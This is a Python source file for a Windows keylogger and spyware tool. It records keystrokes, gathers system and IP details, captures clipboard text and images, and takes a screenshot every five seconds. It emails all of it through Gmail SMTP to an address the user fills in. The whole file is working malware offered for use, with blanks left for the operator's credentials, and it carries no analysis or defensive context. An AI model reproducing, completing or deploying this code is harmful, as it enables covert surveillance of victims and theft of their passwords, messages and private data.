from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.audio import MIMEAudio
from email import encoders
import smtplib
import socket, platform, requests, threading
from pynput.keyboard import Key, Listener
from PIL import Image, ImageGrab
from email.mime.image import MIMEImage
import io
import time
from PIL import ImageGrab
import os
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write
import wave
import win32clipboard

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"


# Update these with your own detail
email_address = ""
# Use an App Password instead of your actual Gmail password
password = " "  # Generate this in your Google Account settings

toaddr = ""  # Update with the recipient's email address

file_path = "" #file path where you want to create the txt files
extend = "\\"
# Variable to track if the program is running
running = True


def send_email(filename, attachment, toaddr):
    try:
        fromaddr = email_address

        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Log File"

        body = "Body_of_the_mail"
        msg.attach(MIMEBase(body, 'plain'))

        filename = filename
        attachment = open(attachment, 'rb')

        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"An error occurred while sending the email: {str(e)}")


count = 0
keys = []
current_string = ""
previous_key = None  # To track the previous key for backspace behavior
running = True  # Variable to track if the program is running

def on_press(key):
    global keys, previous_key, current_string

    try:
        print(key)
        if key == Key.enter:
            keys.append('\n')
            current_string += '\n'
        elif key == Key.backspace:
            # Remove the last character (if any) from current_string
            if current_string and current_string[-1] != '\n':
                current_string = current_string[:-1]
            # Remove the last character from keys (if any)
            if keys and keys[-1] != '\n':
                keys.pop()
        elif key == Key.space:
            keys.append(' ')
            current_string += ' '
        elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
            keys.append(' key.shift ')
            current_string += ' key.shift '
        elif key == Key.ctrl or key == Key.ctrl_r or key == Key.ctrl_l:
            keys.append(' key.ctrl ')
            current_string += ' key.ctrl '
        elif key == Key.esc:
            keys.append(' key.esc ')
            current_string += ' key.esc '
        else:
            # Handle other keys
            k = str(key).replace("'", "")
            keys.append(k)
            current_string += k

        previous_key = key

    except Exception as e:
        print(f"Error on key press: {str(e)}")

def on_release(key):
    global running

    if key == Key.esc:
        # Stop the listener
        running = False
        return False
    else:
        return True  # Continue listening for other keys

# Inside your try block where you start the listener
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        while running:
            pass
except Exception as e:
    print(f"An error occurred: {str(e)}")

# Write the collected keys to the log file
with open(file_path + extend + keys_information, "a") as f:
    f.write(''.join(keys))  # Write the keys list to the file

# print(current_string)  # Print the current string

def get_public_ip():
    try:
        response = requests.get('https://ipinfo.io/ip')
        if response.status_code == 200:
            return response.text.strip()
        else:
            print('Unable to retrieve public IP')
    except requests.RequestException as e:
        print(f'An error occurred: {e}')
        return None

#for computer information 
def computer_information():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    # Fetch and write the public IP immediately
    public_ip = get_public_ip()
    if public_ip:
        with open(file_path + extend + system_information, "a") as f:
            f.write("Public IP Address: " + public_ip + "\n")
    else:
        print('Unable to retrieve public IP')

    with open(file_path + extend + system_information, "a") as f:
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()



def clipboardinfo_text():
    try:
        import win32clipboard

        # Open the clipboard
        win32clipboard.OpenClipboard()

        # Get clipboard data
        pasted_data = win32clipboard.GetClipboardData()

        # Close the clipboard
        win32clipboard.CloseClipboard()

        # Append the clipboard data to clipboardinformation.txt
        with open('clipboard.txt', 'a') as f:
            f.write("Clipboard Text Data:\n" + str(pasted_data) + "\n\n")

    except Exception as e:
        print(f"An error occurred while copying clipboard text: {str(e)}")

# Usage
clipboardinfo_text()

def send_email_with_image(filename, image_data, toaddr):
    try:
        # Create a MIMEImage object for the image
        image_part = MIMEImage(image_data, name=filename)
        image_part.add_header('Content-Disposition', f'attachment; filename="{filename}"')

        # Create the email message
        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = toaddr
        msg['Subject'] = "Clipboard Image"

        # Attach the image
        msg.attach(image_part)

        # Connect to the SMTP server and send the email
        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.starttls()
            s.login(email_address, password)
            s.sendmail(email_address, toaddr, msg.as_string())

        print("Email with image sent successfully!")
    except Exception as e:
        print(f"An error occurred while sending the email: {str(e)}")
#image
copied_images = []  # List to store captured images

def is_clipboard_image():
    try:
        # Capture the clipboard image
        clipboard_image = ImageGrab.grabclipboard()

        if clipboard_image and isinstance(clipboard_image, Image.Image):
            return True, clipboard_image
        else:
            return False, None
    except Exception as e:
        print(f"An error occurred while checking clipboard image: {str(e)}")
        return False, None

def process_clipboard():
    is_image, clipboard_data = is_clipboard_image()

    if is_image:
        try:
            # Convert the image to bytes
            image_buffer = io.BytesIO()
            clipboard_data.save(image_buffer, format='PNG')
            image_data = image_buffer.getvalue()

            # Send the image via email
            send_email_with_image('clipboard_image.png', image_data, toaddr)
        except Exception as e:
            print(f"An error occurred while processing clipboard image: {str(e)}")
    else:
        clipboardinfo_text()

# Usage
process_clipboard()
# # Send the log file as an email attachment
send_email(keys_information, file_path + extend + keys_information, toaddr)
send_email(system_information, file_path + extend + system_information, toaddr)
send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)


#Function to take screenshot
def take_screenshot(filename):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        return True
    except Exception as e:
        print(f"An error occurred while taking a screenshot: {str(e)}")
        return False

# Function to continuously take screenshots at short intervals and send them via email
def take_and_send_screenshots(interval, toaddr):
    screenshot_dir = file_path + extend + "screenshots"
    os.makedirs(screenshot_dir, exist_ok=True)

    while True:
        timestamp = time.strftime("%Y-%m-%d %H-%M-%S")
        filename = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")

        if take_screenshot(filename):
            print(f"Screenshot taken and saved as {filename}")
            send_email(f"screenshot_{timestamp}.png", filename, toaddr)
        time.sleep(interval)  # Wait for the specified interval before taking the next screenshot


# Take and send screenshots in an infinite loop with a short interval
take_and_send_screenshots(interval=5, toaddr=toaddr)
